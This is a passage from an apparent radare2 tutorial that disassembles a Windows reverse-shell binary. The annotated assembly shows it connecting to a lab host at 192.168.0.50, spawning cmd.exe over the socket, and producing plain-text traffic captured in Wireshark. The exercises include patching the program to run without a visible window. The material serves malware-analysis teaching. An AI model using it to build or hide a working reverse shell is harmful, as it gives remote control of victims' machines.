|           0x004015a2      ba01000000     mov edx, 1
|           0x004015a7      b902000000     mov ecx, 2
|           0x004015ac      488b05bd6c00.  mov rax, qword sym.imp.WS2_32.dll_WSASocketA ; [0x408270:8]=0x848e reloc.WS2_32.dll_WSASocketA
|           0x004015b3      ffd0           call rax
|           0x004015b5      488985280200.  mov qword [arg_228h], rax   ; [0x228:8]=-1 ; 552
|           0x004015bc      66c785800000.  mov word [arg_80h], 2       ; [0x80:2]=0xffff ; 2
|           0x004015c5      b95b110000     mov ecx, 0x115b
|           0x004015ca      488b05b76c00.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x408288:8]=0x84b8 reloc.WS2_32.dll_htons
|           0x004015d1      ffd0           call rax
|           0x004015d3      668985820000.  mov word [arg_82h], ax      ; [0x82:2]=0xffff ; 130
|           0x004015da      488d0d1f2a00.  lea rcx, str.192.168.0.50   ; section..rdata ; 0x404000 ; "192.168.0.50"
|           0x004015e1      488b05a86c00.  mov rax, qword sym.imp.WS2_32.dll_inet_addr ; [0x408290:8]=0x84c0 reloc.WS2_32.dll_inet_addr
|           0x004015e8      ffd0           call rax
|           0x004015ea      898584000000   mov dword [arg_84h], eax    ; [0x84:4]=-1 ; 132
|           0x004015f0      488d85800000.  lea rax, [arg_80h]          ; 0x80 ; 128
|           0x004015f7      488b8d280200.  mov rcx, qword [arg_228h]   ; [0x228:8]=-1 ; 552
|           0x004015fe      48c744243000.  mov qword [local_30h], 0
|           0x00401607      48c744242800.  mov qword [local_28h_2], 0
|           0x00401610      48c744242000.  mov qword [local_20h], 0
|           0x00401619      41b900000000   mov r9d, 0
|           0x0040161f      41b810000000   mov r8d, 0x10               ; 16
|           0x00401625      4889c2         mov rdx, rax
|           0x00401628      488b05316c00.  mov rax, qword sym.imp.WS2_32.dll_WSAConnect ; [0x408260:8]=0x846e reloc.WS2_32.dll_WSAConnect ; "n\x84"
|           0x0040162f      ffd0           call rax
|           0x00401631      83f8ff         cmp eax, 0xffffffffffffffff
|       ,=< 0x00401634      7538           jne 0x40166e
|       |   0x00401636      488b052b6c00.  mov rax, qword sym.imp.WS2_32.dll_WSAGetLastError ; [0x408268:8]=0x847c reloc.WS2_32.dll_WSAGetLastError ; "|\x84"
|       |   0x0040163d      ffd0           call rax
|       |   0x0040163f      89c2           mov edx, eax
|       |   0x00401641      488d0dc52900.  lea rcx, str.error__d       ; 0x40400d ; "error %d \n"
|       |   0x00401648      e88b160000     call sym.printf             ; int printf(const char *format)
|       |   0x0040164d      488b85280200.  mov rax, qword [arg_228h]   ; [0x228:8]=-1 ; 552
|       |   0x00401654      4889c1         mov rcx, rax
|       |   0x00401657      488b05226c00.  mov rax, qword sym.imp.WS2_32.dll_closesocket ; [0x408280:8]=0x84aa reloc.WS2_32.dll_closesocket
|       |   0x0040165e      ffd0           call rax
|       |   0x00401660      488b05f16b00.  mov rax, qword sym.imp.WS2_32.dll_WSACleanup ; [0x408258:8]=0x8460 reloc.WS2_32.dll_WSACleanup ; "`\x84"
|       |   0x00401667      ffd0           call rax
|      ,==< 0x00401669      e9fc000000     jmp 0x40176a
|      ||   ; JMP XREF from 0x00401634 (sym.doShell)
|      |`-> 0x0040166e      488d0da32900.  lea rcx, str.connecting     ; 0x404018 ; "connecting "
|      |    0x00401675      e856160000     call sym.puts               ; int puts(const char *s)
|      |    0x0040167a      4889e8         mov rax, rbp
|      |    0x0040167d      41b868000000   mov r8d, 0x68               ; 'h' ; 104
|      |    0x00401683      ba00000000     mov edx, 0
|      |    0x00401688      4889c1         mov rcx, rax
|      |    0x0040168b      e850160000     call sym.memset             ; void *memset(void *s, int c, size_t n)
|      |    0x00401690      c74500680000.  mov dword [rbp], 0x68       ; 'h' ; 104
|      |    0x00401697      c7453c010100.  mov dword [arg_3ch], 0x101  ; 257
|      |    0x0040169e      488b85280200.  mov rax, qword [arg_228h]   ; [0x228:8]=-1 ; 552
|      |    0x004016a5      48894560       mov qword [arg_60h], rax    ; [0x60:8]=-1 ; '`' ; 96
|      |    0x004016a9      488b4560       mov rax, qword [arg_60h]    ; [0x60:8]=-1 ; '`' ; 96
|      |    0x004016ad      48894558       mov qword [arg_58h], rax    ; [0x58:8]=-1 ; 'X' ; 88
|      |    0x004016b1      488b4558       mov rax, qword [arg_58h]    ; [0x58:8]=-1 ; 'X' ; 88
|      |    0x004016b5      48894550       mov qword [arg_50h], rax    ; [0x50:8]=-1 ; 'P' ; 80
|      |    0x004016b9      488d45d8       lea rax, [local_28h]
|      |    0x004016bd      488d55e0       lea rdx, [local_20h_2]
|      |    0x004016c1      4889542448     mov qword [local_48h], rdx
|      |    0x004016c6      4889ea         mov rdx, rbp
|      |    0x004016c9      4889542440     mov qword [local_40h], rdx
|      |    0x004016ce      48c744243800.  mov qword [local_38h], 0
|      |    0x004016d7      48c744243000.  mov qword [local_30h], 0
|      |    0x004016e0      c74424280000.  mov dword [local_28h_2], 0
|      |    0x004016e8      c74424200100.  mov dword [local_20h], 1
|      |    0x004016f0      41b900000000   mov r9d, 0
|      |    0x004016f6      41b800000000   mov r8d, 0
|      |    0x004016fc      4889c2         mov rdx, rax
|      |    0x004016ff      b900000000     mov ecx, 0
|      |    0x00401704      488b059d6b00.  mov rax, qword sym.imp.KERNEL32.dll_CreateProcessA ; [0x4082a8:8]=0x84da reloc.KERNEL32.dll_CreateProcessA
|      |    0x0040170b      ffd0           call rax
|      |    0x0040170d      488b45e0       mov rax, qword [local_20h_2]
|      |    0x00401711      baffffffff     mov edx, 0xffffffff         ; -1
|      |    0x00401716      4889c1         mov rcx, rax
|      |    0x00401719      488b05486c00.  mov rax, qword sym.imp.KERNEL32.dll_WaitForSingleObject ; [0x408368:8]=0x86d4 reloc.KERNEL32.dll_WaitForSingleObject
|      |    0x00401720      ffd0           call rax
|      |    0x00401722      488b45e0       mov rax, qword [local_20h_2]
|      |    0x00401726      4889c1         mov rcx, rax
|      |    0x00401729      488b05706b00.  mov rax, qword sym.imp.KERNEL32.dll_CloseHandle ; [0x4082a0:8]=0x84cc reloc.KERNEL32.dll_CloseHandle
|      |    0x00401730      ffd0           call rax
|      |    0x00401732      488b45e8       mov rax, qword [local_18h]
|      |    0x00401736      4889c1         mov rcx, rax
|      |    0x00401739      488b05606b00.  mov rax, qword sym.imp.KERNEL32.dll_CloseHandle ; [0x4082a0:8]=0x84cc reloc.KERNEL32.dll_CloseHandle
|      |    0x00401740      ffd0           call rax
|      |    0x00401742      488b85280200.  mov rax, qword [arg_228h]   ; [0x228:8]=-1 ; 552
|      |    0x00401749      4889c1         mov rcx, rax
|      |    0x0040174c      488b052d6b00.  mov rax, qword sym.imp.WS2_32.dll_closesocket ; [0x408280:8]=0x84aa reloc.WS2_32.dll_closesocket
|      |    0x00401753      ffd0           call rax
|      |    0x00401755      488b05fc6a00.  mov rax, qword sym.imp.WS2_32.dll_WSACleanup ; [0x408258:8]=0x8460 reloc.WS2_32.dll_WSACleanup ; "`\x84"
|      |    0x0040175c      ffd0           call rax
|      |    0x0040175e      488d0dbf2800.  lea rcx, str.shell_closed   ; 0x404024 ; "shell closed "
|      |    0x00401765      e866150000     call sym.puts               ; int puts(const char *s)
|      |    ; JMP XREF from 0x00401669 (sym.doShell)
|      `--> 0x0040176a      90             nop
|           0x0040176b      4881c4b00200.  add rsp, 0x2b0
|           0x00401772      5d             pop rbp
\           0x00401773      c3             ret
[0x00401550]>
```
So we start by seeing "cmd.exe" being initialized inside local_28h:

```
|           0x00401558      488dac248000.  lea rbp, [local_80h]        ; 0x80 ; 128
|           0x00401560      48b8636d642e.  movabs rax, 0x6578652e646d63
|           0x0040156a      488945d8       mov qword [local_28h], rax
```
On situations like this, you may want to use something like afvn to rename that variable to cmdExe or something like that, especially on large programs.

Then the WSAStartup call
```
|           0x0040157d      488b05f46c00.  mov rax, qword sym.imp.WS2_32.dll_WSAStartup ; [0x408278:8]=0x849c reloc.WS2_32.dll_WSAStartup
|           0x00401584      ffd0           call rax
|           0x00401586      c74424280000.  mov dword [local_28h_2], 0
|           0x0040158e      c74424200000.  mov dword [local_20h], 0
|           0x00401596      41b900000000   mov r9d, 0
```
And an internet socket is created (0,6,1,2)

```
|           0x0040158e      c74424200000.  mov dword [local_20h], 0
|           0x00401596      41b900000000   mov r9d, 0
|           0x0040159c      41b806000000   mov r8d, 6
|           0x004015a2      ba01000000     mov edx, 1
|           0x004015a7      b902000000     mov ecx, 2
|           0x004015ac      488b05bd6c00.  mov rax, qword sym.imp.WS2_32.dll_WSASocketA ; [0x408270:8]=0x848e reloc.WS2_32.dll_WSASocketA
```
arg_228h will be the var containing the socket descriptor.

Note that eventhough we are not using the socket() call here, it's the same (think about retro compatibilitty stuff)

Then as we see htons and inet_addr we can quickly identify ip/port stuff 

```
|           0x004015b5      488985280200.  mov qword [arg_228h], rax   ; [0x228:8]=-1 ; 552
|           0x004015bc      66c785800000.  mov word [arg_80h], 2       ; [0x80:2]=0xffff ; 2
|           0x004015c5      b95b110000     mov ecx, 0x115b
|           0x004015ca      488b05b76c00.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x408288:8]=0x84b8 reloc.WS2_32.dll_htons
|           0x004015d1      ffd0           call rax
|           0x004015d3      668985820000.  mov word [arg_82h], ax      ; [0x82:2]=0xffff ; 130
|           0x004015da      488d0d1f2a00.  lea rcx, str.192.168.0.50   ; section..rdata ; 0x404000 ; "192.168.0.50"
|           0x004015e1      488b05a86c00.  mov rax, qword sym.imp.WS2_32.dll_inet_addr ; [0x408290:8]=0x84c0 reloc.WS2_32.dll_inet_addr
```
Now we see that 0x10 as well as arg_80h being passed to the socket:
```
|           0x004015e1      488b05a86c00.  mov rax, qword sym.imp.WS2_32.dll_inet_addr ; [0
|           0x004015e8      ffd0           call rax
|           0x004015ea      898584000000   mov dword [arg_84h], eax    ; [0x84:4]=-1 ; 132
|           0x004015f0      488d85800000.  lea rax, [arg_80h]          ; 0x80 ; 128
[...]
|           0x00401625      4889c2         mov rdx, rax
```
0x10 is the size (16) of the sockaddr struct, we can see that easily:

```
[0x00401628]> pxw @ 0x0022fc70
0x0022fc70  0x5b110002 0x3200a8c0 0x005f2e10 0x00000000  ...[...2.._.....
0x0022fc80  0x02020202 0x00000000 0x777a94e3 0x00000000  ..........zw....
```
As you can easily identify: 0x3200a8c0 == 192.168.0.50 in network byteorder. Be aware of that as most malware programs will already have the thing encoded in byte order to try to avoid basic identification mechanisms 

Then the big StartupInfo struct gets initialized:

```
|      |    0x00401690      c74500680000.  mov dword [rbp], 0x68       ; 'h' ; 104
|      |    0x00401697      c7453c010100.  mov dword [arg_3ch], 0x101  ; 257
|      |    0x0040169e      488b85280200.  mov rax, qword [arg_228h]   ; [0x228:8]=-1 ; 552
|      |    0x004016a5      48894560       mov qword [arg_60h], rax    ; [0x60:8]=-1 ; '`' ; 96
|      |    0x004016a9      488b4560       mov rax, qword [arg_60h]    ; [0x60:8]=-1 ; '`' ; 96
|      |    0x004016ad      48894558       mov qword [arg_58h], rax    ; rcx ; [0x58:8]=-1
|      |    0x004016b1      488b4558       mov rax, qword [arg_58h]    ; rcx ; [0x58:8]=-1
|      |    0x004016b5      48894550       mov qword [arg_50h], rax    ; [0x50:8]=-1 ; 'P' ; 80
|      |    0x004016b9      488d45d8       lea rax, [local_28h]
|      |    0x004016bd      488d55e0       lea rdx, [local_20h_2]
|      |    0x004016c1      4889542448     mov qword [local_48h], rdx
|      |    0x004016c6      4889ea         mov rdx, rbp
|      |    0x004016c9      4889542440     mov qword [local_40h], rdx
|      |    0x004016ce      48c744243800.  mov qword [local_38h], 0
|      |    0x004016d7      48c744243000.  mov qword [local_30h], 0
|      |    0x004016e0      c74424280000.  mov dword [local_28h_2], 0
|      |    0x004016e8      c74424200100.  mov dword [local_20h], 1
|      |    0x004016f0      41b900000000   mov r9d, 0
```
To be then passed to the CreateProcessA call:

And at this point we are done with the program:
```
|      |    0x004016ff      b900000000     mov ecx, 0
|      |    0x00401704      488b059d6b00.  mov rax, qword sym.imp.KERNEL32.dll_CreateProcessA ; [0x4082a8:8]=0x7756ad60 ; "`\xadVw"
|      |    0x0040170b      ffd0           call rax
|      |    0x0040170d      488b45e0       mov rax, qword [local_20h_2]
|      |    0x00401711      baffffffff     mov edx, 0xffffffff         ; -1
|      |    0x00401716      4889c1         mov rcx, rax
|      |    0x00401719      488b05486c00.  mov rax, qword sym.imp.KERNEL32.dll_WaitForSingleObject ; [0x408368:8]=0x774f1050 ; "P\x10Ow"
```
And the connection begins, in wireshark you should see something like this for the commands:

```
00000097  0a                                                 .
00000098  43 3a 5c 55 73 65 72 73  5c 6c 61 62 5c 44 6f 63   C:\Users \lab\Doc
000000A8  75 6d 65 6e 74 73 5c 63  6f 64 65 5c 72 65 76 73   uments\c ode\revs
000000B8  68 65 6c 6c 3e                                     hell>
    00000001  64 69 72 0a                                        dir.
```
As you see, it is just plain text being sent/received. And that is a problem by the way, as some IDS like snort/suricata can be easily configured to detect and block stuff like this...


So, want to get hands on?

Exercises: 
- Use r2pipe to log connections in the bind shell program 
- Map those structs like processinfo to get a nicer look while reversing 
- Patch the program to act without prompting any window 